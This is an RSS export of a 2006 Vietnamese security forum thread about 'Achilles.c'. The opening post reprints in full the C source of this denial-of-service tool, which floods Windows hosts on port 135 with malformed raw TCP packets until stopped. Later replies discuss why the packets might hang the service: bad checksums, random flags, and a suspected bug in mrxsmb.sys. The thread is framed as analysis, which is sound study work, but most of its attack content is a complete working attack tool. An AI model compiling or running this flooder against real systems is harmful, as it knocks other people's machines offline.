@@ -1,0 +1,407 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Windows XP/NT/SMB2003/2000 DoS (Achilles)"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Windows XP/NT/SMB2003/2000 DoS (Achilles)"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ SUMMARY
+
+The following exploit code has been reported to cause Windows XP/NT/2003 
+and 2000 to stop responding.
+
+DETAILS
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Exploit:
+/*
+ * Achilles.c version2
+ * Remodified Achilles Windows Attack Tool
+ * compiled on FreeBSD 6.1, SuSE 10
+ * Solaris 10, NetBSD 3.0,
+ * Proof of Concept tool that disconnects
+ * Windows machines until the program is
+ * stopped. Tested locally and remotely.
+ *
+ * linux:~ # uname -a
+ * Linux linux 2.6.13-15.10-default #1 Fri May 12 16:27:12 UTC 2006 i386 
+GNU/Linux
+ *
+ * $ uname -a
+ * SunOS unknown 5.10 Generic_118822-25 sun4u sparc SUNW,Sun-Fire-280R
+ *
+ * -bash2-2.05b$ uname -a
+ * FreeBSD hypnos 5.4-RELEASE-p14 FreeBSD 5.4-RELEASE-p14 #1: Thu May 11 
+01:34:54 CDT 2006 toor@hypnos:/usr/obj/usr/src/sys/HYPNOS  i386
+ *
+ * &#40;c&#41; 2006 J. Oquendo Genexsys.net::Infiltrated.net
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+
+#ifndef __USE_BSD
+#define __USE_BSD
+
+#endif
+
+#ifndef __FAVOR_BSD
+
+#define __FAVOR_BSD
+
+#endif
+
+#include &lt;netinet/in_systm.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/tcp.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+
+#ifdef LINUX
+#define FIX&#40;x&#41; htons&#40;x&#41;
+
+#else
+
+#define FIX&#40;x&#41; &#40;x&#41;
+#endif
+
+struct ip_hdr {
+    u_int ip_hl:4,
+                ip_v:4;
+    u_char ip_tos;
+    u_short ip_len;
+    u_short ip_id;
+    u_short ip_off;
+    u_char ip_ttl;
+    u_char ip_p;
+    u_short ip_sum;
+    u_long saddr, daddr;
+};
+
+struct tcp_hdr {
+    u_short th_sport;
+    u_short th_dport;
+    u_long th_seq;
+    u_long th_syn;
+    u_int th_x2:4,
+                th_off:4;
+    u_char th_flags;
+    u_short th_win;
+    u_short th_sum;
+    u_short th_urp;
+};
+
+struct tcpopt_hdr {
+    u_char type;
+    u_char len;
+    u_short value;
+};
+
+struct pseudo_hdr {
+    u_long saddr, daddr;
+    u_char mbz, ptcl;
+    u_short tcpl;
+};
+
+struct packet {
+    struct ip/*_hdr*/ ip;
+    struct tcphdr tcp;
+};
+
+struct cksum {
+    struct pseudo_hdr pseudo;
+    struct tcphdr tcp;
+};
+
+struct packet packet;
+struct cksum cksum;
+struct sockaddr_in s_in;
+u_short bgport, bgsize, pps;
+u_long radd;
+u_long sradd;
+int sock;
+
+void usage&#40;char *progname&#41;
+{
+    fprintf&#40;stderr, "Usage: %s &lt;dst&gt; &lt;src&gt; &lt;size&gt; &lt;number&gt;\n", progname&#41;;
+    fprintf&#40;stderr, "dst:\tDestination Address\n"&#41;;
+    fprintf&#40;stderr, "src:\tSource Address\n"&#41;;
+    fprintf&#40;stderr, "size:\tSize of packet\n"&#41;;
+    fprintf&#40;stderr, "num:\tpackets\n\n"&#41;;
+    exit&#40;1&#41;;
+}
+
+inline u_short in_cksum&#40;u_short *addr, int len&#41;
+{
+    register int nleft = len;
+    register u_short *w = addr;
+    register int sum = 0;
+    u_short answer = 0;
+     while &#40;nleft &gt; 1&#41; {
+         sum += *w++;
+         nleft -= 2;
+     }
+     if &#40;nleft == 1&#41; {
+         *&#40;u_char *&#41;&#40;&answer&#41; = *&#40;u_char *&#41; w;
+         sum += answer;
+     }
+     sum = &#40;sum &gt;&gt; 16&#41; + &#40;sum & 0xF0F0&#41;;
+     sum += &#40;sum &gt;&gt; 16&#41;;
+     answer = ~sum;
+     return&#40;answer&#41;;
+}
+
+u_long lookup&#40;char *hostname&#41;
+{
+    struct hostent *hp;
+
+    if &#40;&#40;hp = gethostbyname&#40;hostname&#41;&#41; == NULL&#41; {
+       fprintf&#40;stderr, "Could not resolve %s\n", hostname&#41;;
+       exit&#40;1&#41;;
+    }
+
+    return *&#40;u_long *&#41;hp-&gt;h_addr;
+}
+
+void flooder&#40;void&#41;
+{
+    struct timespec ts;
+    int i;
+
+    memset&#40;&packet, 0, sizeof&#40;packet&#41;&#41;;
+
+    ts.tv_sec = 0;
+    ts.tv_nsec = 100;
+
+    packet.ip.ip_hl = 5;
+    packet.ip.ip_v = 4;
+    packet.ip.ip_p = IPPROTO_TCP;
+    packet.ip.ip_tos = 0xa0;
+    packet.ip.ip_id = radd;
+    packet.ip.ip_len = FIX&#40;sizeof&#40;packet&#41;&#41;;
+    packet.ip.ip_off = 0;
+    packet.ip.ip_ttl = 255;
+    packet.ip.ip_dst.s_addr = radd;
+
+    packet.tcp.th_flags = 0;
+    packet.tcp.th_win = 65535;
+    packet.tcp.th_seq = random&#40;&#41;;
+    packet.tcp.th_ack = 0;
+    packet.tcp.th_off = random&#40;&#41;;
+    packet.tcp.th_urp = 0;
+    packet.tcp.th_dport = 135;
+    cksum.pseudo.daddr = sradd;
+    cksum.pseudo.mbz = random&#40;&#41;; /* WATCH ME CLOSELY */
+    cksum.pseudo.ptcl = IPPROTO_TCP;
+    cksum.pseudo.tcpl = random&#40;&#41;;
+
+    s_in.sin_family = AF_INET;
+    s_in.sin_addr.s_addr = sradd;
+    s_in.sin_port = 135;
+
+    for&#40;i=0;;++i&#41; {
+    if&#40; !&#40;i&31337&#41; &#41; {
+        packet.tcp.th_sport = 135;
+        cksum.pseudo.saddr = packet.ip.ip_src.s_addr = sradd;
+        packet.tcp.th_flags = random&#40;&#41;;
+        packet.tcp.th_ack = random&#40;&#41;;
+
+    }
+    else {
+        packet.tcp.th_flags = rand&#40;&#41;;
+        packet.tcp.th_ack = rand&#40;&#41;;
+    }
+       ++packet.ip.ip_id;
+       /*++packet.tcp.th_sport*/;
+       ++packet.tcp.th_seq;
+
+       if &#40;!bgport&#41;
+          s_in.sin_port = packet.tcp.th_dport = 135;
+
+       packet.ip.ip_sum = 0;
+       packet.tcp.th_sum = 0;
+
+       cksum.tcp = packet.tcp;
+
+       packet.ip.ip_sum = in_cksum&#40;&#40;void *&#41;&packet.ip, 20&#41;;
+       packet.tcp.th_sum = in_cksum&#40;&#40;void *&#41;&cksum, sizeof&#40;cksum&#41;&#41;;
+
+       if &#40;sendto&#40;sock, &packet, sizeof&#40;packet&#41;, 0, &#40;struct sockaddr 
+*&#41;&s_in, sizeof&#40;s_in&#41;&#41; &lt; 0&#41;;
+
+    }
+}
+
+int main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+    int on = 1;
+
+    printf&#40;"Achilles.c Windows Attack Tool\n"&#41;;
+
+
+    if &#40;&#40;sock = socket&#40;PF_INET, SOCK_RAW, IPPROTO_RAW&#41;&#41; &lt; 0&#41; {
+       perror&#40;"socket"&#41;;
+       exit&#40;1&#41;;
+    }
+
+    setgid&#40;getgid&#40;&#41;&#41;; setuid&#40;getuid&#40;&#41;&#41;;
+
+    if &#40;argc &lt; 4&#41;
+       usage&#40;argv&#91;0&#93;&#41;;
+
+    if &#40;setsockopt&#40;sock, IPPROTO_IP, IP_HDRINCL, &#40;char *&#41;&on, sizeof&#40;on&#41;&#41; 
+&lt; 0&#41;
+
+{
+       perror&#40;"setsockopt"&#41;;
+       exit&#40;1&#41;;
+
+    }
+
+    srand&#40;&#40;time&#40;NULL&#41; ^ getpid&#40;&#41;&#41; + getppid&#40;&#41;&#41;;
+
+    printf&#40;"\nFinding host\n"&#41;; fflush&#40;stdout&#41;;
+
+    radd = lookup&#40;argv&#91;1&#93;&#41;;
+    bgport = atoi&#40;argv&#91;3&#93;&#41;;
+    bgsize = atoi&#40;argv&#91;4&#93;&#41;;
+    sradd = lookup&#40;argv&#91;2&#93;&#41;;
+    printf&#40;"Achilles: Before my time is done I will look down on your 
+corpse and smile.\n"&#41;;
+
+    flooder&#40;&#41;;
+
+    return 0;
+}</pre>
+		</div>
+
+Thử tìm xem những dòng nào trong đoạn code trên quyết định tính dung hại của chương trình này? :))
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#10352</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#10352</link>
+				<pubDate><![CDATA[Thu, 27 Jul 2006 11:17:25]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ Hèm... ví dụ này kinh điển vậy mà không ai thèm tham gia hay sao trời? :((
+
+Uổng thiệt.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11199</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11199</link>
+				<pubDate><![CDATA[Sun, 30 Jul 2006 18:30:46]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ 
+Em thấy cái gói tin mà chương trình gửi đi, TCP Header bị thiếu mất pseudo_header, checksum cũng tính không đúng nữa ! Khi tính checksum thì có cả pseudo, còn gửi đi thì không có :cry: . Dest port thì bị chỉ định sai, không phải port 135. :( 
+
+-> Em chưa hiểu cơ chế nào khiến service SMB của Windows bị treo. Có phải bug này được mô tả trong MS06-030 không?
+
+(Hình như src này cố ý sửa đổi rồi thì phải, các tham số dòng lệnh và trong src không tương ứng ...  ) :mrgreen:  ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11270</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11270</link>
+				<pubDate><![CDATA[Sun, 30 Jul 2006 23:13:46]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ Có 2 chỗ có vấn đề trong pseudo-header
+
+1. 8 bit trước của ptrl phải là 0
+2. TCP length  không phải là random
+
+Nhưng mà cái pseudo-header chỉ dùng để tính check sum, nếu check sum sai thì packet đó bị bỏ qua, tại sao lại stop responding nhỉ ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11339</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11339</link>
+				<pubDate><![CDATA[Mon, 31 Jul 2006 09:23:34]]> GMT</pubDate>
+				<author><![CDATA[ NoobBK]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>..............
+         packet.tcp.th_flags = random&#40;&#41;;
+         packet.tcp.th_ack = random&#40;&#41;;
+       .......... 
+        packet.tcp.th_flags = rand&#40;&#41;;
+         packet.tcp.th_ack = rand&#40;&#41;;</pre>
+		</div>
+
+Nếu em đây ngu muội xin bỏ qua cho ,theo nhận xét của cá nhân em thì tính dung hại của cái thèng này nằm ở chỗ nó random flags ,hic làm seo mà lọc đc khi mà nó cứ nhảy tùm lum ,không có dạng nhất định như là các DoS System như Trin00 hay tn2k]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11687</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11687</link>
+				<pubDate><![CDATA[Tue, 1 Aug 2006 14:09:26]]> GMT</pubDate>
+				<author><![CDATA[ xnohat]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ Ơ ngộ nhẩy lão Conmale mở topic này ra xong đem con bỏ chợ thế à !!!!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11760</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11760</link>
+				<pubDate><![CDATA[Tue, 1 Aug 2006 19:18:10]]> GMT</pubDate>
+				<author><![CDATA[ xnohat]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">hackernohat wrote:</cite><br>
+		<blockquote>Ơ ngộ nhẩy lão Conmale mở topic này ra xong đem con bỏ chợ thế à !!!!&nbsp;
+		</blockquote>
+
+Nóng vậy :))
+
+Để bà con góp ý thêm cho vui cái đã.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11763</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11763</link>
+				<pubDate><![CDATA[Tue, 1 Aug 2006 19:27:08]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Re: Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ He he có vẻ tụi nhỏ bị lão làm hãi rồi .Em nghĩ là tụi nhỏ ngán cái vụ code này lão ạ  :mrgreen: ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11837</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#11837</link>
+				<pubDate><![CDATA[Wed, 2 Aug 2006 01:00:49]]> GMT</pubDate>
+				<author><![CDATA[ xnohat]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ chán quá em ngày xưa em dốt toán... dân IT mà em xuýt chết vì lập trình.. bó tay.
+HVA có thành viên thế này chắc "Phát triển" lắm đây..
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#13760</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#13760</link>
+				<pubDate><![CDATA[Thu, 10 Aug 2006 04:19:13]]> GMT</pubDate>
+				<author><![CDATA[ tnt20]]></author>
+			</item>
+			<item>
+				<title>Windows XP/NT/SMB2003/2000 DoS (Achilles)</title>
+				<description><![CDATA[ <span class="link"> http://www.packetstormsecurity.org/0607-exploits/Achilles.c</span>
+
+<p></p>
+		<cite class="blockquote">hackernohat wrote:</cite><br>
+		<blockquote>
+ Nếu em đây ngu muội xin bỏ qua cho ,theo nhận xét của cá nhân em thì tính dung hại của cái thèng này nằm ở chỗ nó random flags ,hic làm seo mà lọc đc khi mà nó cứ nhảy tùm lum ,không có dạng nhất định như là các DoS System như Trin00 hay tn2k
+&nbsp;
+		</blockquote>
+
+Chưa cần xét tới filter packet, vấn đề cơ bản là tại sao một gói tin dị dạng: chỉ có header, checksum sai... lại gây ra treo dịch vụ SMB trên port 135 được?. Nguyên nhân phỏng đoán là tại một đoạn code xử lý packet dị dạng nằm trong file mrxsmb.sys gây ra bof khiến cạn kiệt tài nguyên. Bây giờ cần phải reverse file này để tìm ra nguyên nhân. :(]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2033.hva#13953</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2033.hva#13953</link>
+				<pubDate><![CDATA[Thu, 10 Aug 2006 21:09:37]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+	</channel>
+</rss>
